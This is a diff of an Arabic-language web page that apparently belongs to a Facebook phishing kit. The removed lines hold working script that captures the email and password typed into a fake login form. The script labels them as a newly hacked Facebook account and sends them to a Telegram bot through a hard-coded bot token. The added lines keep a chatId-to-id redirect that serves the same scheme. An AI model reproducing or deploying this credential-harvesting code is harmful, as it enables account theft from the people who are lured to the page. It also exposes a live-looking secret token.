@@ -1,4 +1,3 @@
-<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
@@ -71,50 +70,22 @@
    
   </div>
   <script>
-  window.onload = function() {
-    const params = new URLSearchParams(window.location.search);
-    const chatId = params.get('chatId');
-    const id = params.get('id');
+    window.onload = function() {
+      const params = new URLSearchParams(window.location.search);
+      const chatId = params.get('chatId');
+      const id = params.get('id');
 
-    if (chatId && !id) {
-      // لو فيه chatId بس — نحوله لـ id في نفس الرابط
-      const targetURL = ${window.location.pathname}?id=${chatId};
-      window.location.href = targetURL;
-    }
-    // لو فيه id هيكمل عادي بس مش هيعرضه
-  };
-
-  const botToken = "7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA";
-
-  document.getElementById("loginForm").addEventListener("submit", function(e) {
-    e.preventDefault();
-
-    const params = new URLSearchParams(window.location.search);
-    const id = params.get('id');
-
-    if (!id) {
-      alert("❌ لا يوجد ID لإرسال البيانات إليه!");
-      return;
-    }
-
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
-
-    const message = 📥 - تم اختراق حساب فيسبوك جديد :- \n📧 - الإيميل : ${email}\n🔑 - الباسورد : ${password};
-
-    const url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)};
-
-    fetch(url)
-      .then(response => response.json())
-      .then(data => {
-        console.log("✅ تم الإرسال:", data);
-        alert("✅ تم إرسال البيانات!");
-      })
-      .catch(error => {
-        console.error("❌ خطأ:", error);
-        alert("❌ حصلت مشكلة أثناء الإرسال!");
-      });
-  });
-</script>
+      if (chatId) {
+        // لو فيه chatId نحوله إلى id في نفس الصفحة
+        const targetURL = `${window.location.pathname}?id=${chatId}`;
+        window.location.href = targetURL;
+      } else if (id) {
+        // لو فيه id نعرضه
+        document.getElementById('showId').innerText = id;
+      } else {
+        document.getElementById('showId').innerText = "❌ لا يوجد ID في الرابط.";
+      }
+    };
+  </script>
 </body>
 </html>
